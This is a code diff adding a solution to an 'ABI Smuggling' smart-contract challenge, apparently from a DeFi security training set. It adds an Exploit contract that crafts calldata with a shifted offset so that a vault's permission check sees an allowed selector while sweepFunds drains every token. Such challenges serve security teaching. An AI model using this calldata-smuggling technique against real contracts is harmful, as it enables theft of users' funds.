@@ -73,7 +73,10 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        Exploit exploit = new Exploit(address(vault),address(token),recovery);
+
+        bytes memory payload = exploit.execute();
+        address(vault).call(payload);
     }
 
     /**
@@ -83,5 +86,61 @@ contract ABISmugglingChallenge is Test {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit {
+    SelfAuthorizedVault public vault;
+    IERC20 public token;
+    address public player;
+    address public recovery;
+
+    constructor(address _vault, address _token, address _recovery) {
+        vault = SelfAuthorizedVault(_vault);
+        token = IERC20(_token);
+        recovery = _recovery;
+        player = msg.sender;
+    }
+
+    function execute() external returns (bytes memory){
+        require(msg.sender == player,"Only player okay");
+    
+
+    bytes4 executeSelector = vault.execute.selector;
+
+    bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+
+    bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+
+    bytes memory emptyData = abi.encodePacked(uint256(0));
+
+    // manually defining the withdraw function selector as `d9caed12` followed by zers
+    bytes memory WithdrawSelectorPadded = abi.encodePacked(
+        bytes4(0xd9caed12),
+        bytes28(0)
+    );
+
+    // constructing the calldata for the sweepFunds(_)
+    bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+        vault.sweepFunds.selector,
+        recovery,
+        token
+    );
+
+    uint256 actionCallDataLength = sweepFundsCalldata.length;
+    bytes memory actionDataLength = abi.encodePacked(uint256(actionCallDataLength));
+
+    // Combine all parts to create the complete calldata payload
+    bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,              // 4 bytes
+            target,                       // 32 bytes
+            dataOffset,                   // 32 bytes
+            emptyData,                    // 32 bytes
+            WithdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
+            actionDataLength,             // Length of actionData
+            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
+    );
+
+    return calldataPayload;
     }
 }
